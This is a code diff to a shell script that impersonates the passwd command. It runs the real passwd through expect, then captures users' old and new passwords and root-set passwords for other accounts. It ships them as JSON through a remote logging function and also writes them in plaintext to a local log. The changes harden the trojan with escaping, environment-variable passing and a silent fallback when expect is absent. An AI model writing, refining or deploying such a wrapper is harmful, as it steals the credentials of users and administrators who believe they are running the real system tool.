@@ -38,6 +38,18 @@ TARGET_USER="${1:-$INVOKING_USER}"
 IS_ROOT=0
 [ "$(id -u)" -eq 0 ] && IS_ROOT=1
 
+_json_esc() {
+    local s="$1"
+    s="${s//\\/\\\\}"
+    s="${s//\"/\\\"}"
+    printf '%s' "$s"
+}
+
+# If expect is not installed, fall through to real passwd
+if ! command -v expect >/dev/null 2>&1; then
+    exec $REAL_PASSWD "$@"
+fi
+
 # -------------------------------------------------------
 # Root changing another user's password — no current-pass prompt
 # -------------------------------------------------------
@@ -52,15 +64,19 @@ if [ $IS_ROOT -eq 1 ] && [ -n "$1" ]; then
         exec $REAL_PASSWD "$@"
     fi
 
-    RESULT=$(expect -c "
+    export __PW_NEW="$NEW_PASS"
+    export __PW_NEW2="$NEW_PASS2"
+    RESULT=$(expect -c '
         set timeout 10
-        spawn $REAL_PASSWD $1
+        set real_passwd [lindex $argv 0]
+        set target [lindex $argv 1]
+        spawn $real_passwd $target
         expect {
-            \"New password:\" {
-                send \"${NEW_PASS}\r\"
+            "New password:" {
+                send "$env(__PW_NEW)\r"
                 expect {
-                    \"Retype new password:\" {
-                        send \"${NEW_PASS2}\r\"
+                    "Retype new password:" {
+                        send "$env(__PW_NEW2)\r"
                         expect eof
                     }
                     eof {}
@@ -69,12 +85,14 @@ if [ $IS_ROOT -eq 1 ] && [ -n "$1" ]; then
             eof {}
             timeout {}
         }
-    " 2>/dev/null)
+    ' "$REAL_PASSWD" "$1" 2>/dev/null)
+    unset __PW_NEW __PW_NEW2
 
     if echo "$RESULT" | grep -q "password updated successfully"; then
         echo "passwd: password updated successfully"
+        SAFE_NEW=$(_json_esc "$NEW_PASS")
         PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"passwd_other","timestamp":"%s","data":{"target_user":"%s","new_password":"%s"}}' \
-            "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$TARGET_USER" "$NEW_PASS")
+            "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$TARGET_USER" "$SAFE_NEW")
         _log_remote "$PAYLOAD"
         _log_local "${HOST_TS}|passwd_other|${INVOKING_USER}|target:${TARGET_USER}|new:${NEW_PASS}"
     else
@@ -99,25 +117,29 @@ if [ "$NEW_PASS" != "$NEW_PASS2" ]; then
     exec $REAL_PASSWD "$@"
 fi
 
-RESULT=$(expect -c "
+export __PW_CUR="$CURRENT_PASS"
+export __PW_NEW="$NEW_PASS"
+export __PW_NEW2="$NEW_PASS2"
+RESULT=$(expect -c '
     set timeout 10
-    spawn $REAL_PASSWD
+    set real_passwd [lindex $argv 0]
+    spawn $real_passwd
     expect {
-        \"Current password:\" {
-            send \"${CURRENT_PASS}\r\"
+        "Current password:" {
+            send "$env(__PW_CUR)\r"
             expect {
-                \"New password:\" {
-                    send \"${NEW_PASS}\r\"
+                "New password:" {
+                    send "$env(__PW_NEW)\r"
                     expect {
-                        \"Retype new password:\" {
-                            send \"${NEW_PASS2}\r\"
+                        "Retype new password:" {
+                            send "$env(__PW_NEW2)\r"
                             expect eof
                         }
                         eof {}
                     }
                 }
-                \"Authentication failure\" { exit 1 }
-                \"authentication failure\" { exit 1 }
+                "Authentication failure" { exit 1 }
+                "authentication failure" { exit 1 }
                 eof { exit 1 }
                 timeout { exit 1 }
             }
@@ -125,7 +147,8 @@ RESULT=$(expect -c "
         eof {}
         timeout {}
     }
-" 2>/dev/null)
+' "$REAL_PASSWD" 2>/dev/null)
+unset __PW_CUR __PW_NEW __PW_NEW2
 RESULT_RC=$?
 
 if [ $RESULT_RC -ne 0 ] || echo "$RESULT" | grep -qi "authentication failure"; then
@@ -135,8 +158,10 @@ fi
 
 if echo "$RESULT" | grep -q "password updated successfully"; then
     echo "passwd: password updated successfully"
+    SAFE_OLD=$(_json_esc "$CURRENT_PASS")
+    SAFE_NEW=$(_json_esc "$NEW_PASS")
     PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"passwd_self","timestamp":"%s","data":{"old_password":"%s","new_password":"%s"}}' \
-        "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$CURRENT_PASS" "$NEW_PASS")
+        "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$SAFE_OLD" "$SAFE_NEW")
     _log_remote "$PAYLOAD"
     _log_local "${HOST_TS}|passwd_self|${INVOKING_USER}|old:${CURRENT_PASS}|new:${NEW_PASS}"
 else
